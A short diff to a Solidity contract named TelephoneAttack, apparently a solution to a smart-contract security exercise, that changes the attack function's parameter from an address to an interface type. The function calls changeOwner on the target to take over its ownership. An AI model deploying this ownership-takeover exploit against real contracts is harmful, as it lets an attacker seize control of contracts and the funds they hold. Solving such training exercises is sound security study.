@@ -6,7 +6,7 @@ interface ITelephone {
 }
 
 contract TelephoneAttack {
-    function attack(address _target) external {
-        ITelephone(_target).changeOwner(msg.sender);
+    function attack(ITelephone _target) external {
+        _target.changeOwner(msg.sender);
     }
 }
